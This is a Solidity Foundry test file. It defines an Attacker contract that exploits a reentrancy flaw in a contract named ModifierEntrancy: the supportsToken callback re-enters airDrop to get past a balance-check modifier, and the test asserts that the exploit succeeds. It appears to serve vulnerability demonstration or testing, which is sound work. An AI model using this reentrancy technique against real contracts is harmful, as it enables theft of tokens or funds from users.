
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    
    ModifierEntrancy public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        _victim.airDrop();

        // If reentrancy worked, we bypassed the hasNoBalance check on the second call
        // resulting in 20 + 20 = 40 tokens.
        if (_victim.tokenBalance(address(this)) > 20) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns(bytes32){
        // Re-enter the airDrop function once
        if(attackCallCount < 1){
            attackCallCount++;
            _victim.airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }

    receive() external payable {}
}
